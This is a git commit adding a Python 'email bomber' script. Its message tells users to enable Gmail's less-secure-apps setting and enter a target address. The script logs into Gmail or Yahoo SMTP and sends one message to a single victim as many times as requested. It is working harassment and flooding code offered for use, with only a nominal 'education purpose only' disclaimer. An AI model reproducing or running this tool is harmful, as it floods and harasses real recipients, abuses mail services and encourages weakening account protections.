73eb540a9cd4df74db54b1189a2106ce78914e56
ATAR <65398082+xatarox@users.noreply.github.com>
2021-05-13 12:46:33 +0200

    Add files via upload
    Hi !
    To use this email bomber, create or use your own email address (only gmail or yahoo)
    If you use a gmail account, don't forget to click on this link ( https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Pwy8YoWVANe9zQTtmrpDtMIihL9BHyg4EOD9XQDwP-4BVCkiTMuo1vZF7T8IwjeXabbT_ZKochhQcVpJQoOAPwBMlL4g )
    to let your python code work.
    Then enter username, password, who you want to send this to, etc...
    Super simple !

---
+++ Email-Bomb.py
@@ -0,0 +1,59 @@
+#!/usr/bin/python
+#Email-Bomber.py by aTAR!
+#This code for education purpose only.
+#Use it at your own risk !
+
+import os
+import smtplib
+import getpass
+import sys
+
+
+server = input ('Server Mail: ')
+user = input('Username: ')
+passwd = input('Password: ')
+
+
+to = input('\nTo: ')
+subject = input('Subject: ') 
+body = input('Message: ')
+total = int(input('Number of send: '))
+total=total+1
+if server == 'gmail':
+    smtp_server = 'smtp.gmail.com'
+    port = 587
+elif server == 'yahoo':
+    smtp_server = 'smtp.mail.yahoo.com'
+    port = 25
+else:
+    print('Applies only to gmail and yahoo.')
+    sys.exit()
+
+print('')
+
+try:
+    server = smtplib.SMTP(smtp_server,port) 
+    server.ehlo()
+    if smtp_server == "smtp.gmail.com":
+            server.starttls()
+    server.login(user,passwd)
+    for i in range(1, total):
+        #subject = os.urandom(9)
+        msg = "\r\n".join([
+  "From: " + user,
+  "To: " + to,
+  "Subject: "+ subject,
+  "",
+  body,
+  ])
+        server.sendmail(user,to,msg)
+        print ("\rTotal emails sent: %i" % i)
+        sys.stdout.flush()
+    server.quit()
+    print('\n Done !')
+except KeyboardInterrupt:
+    print('[-] Canceled')
+    sys.exit()
+except smtplib.SMTPAuthenticationError:
+    print('\n[!] The username or password you entered is incorrect.')
+    sys.exit()
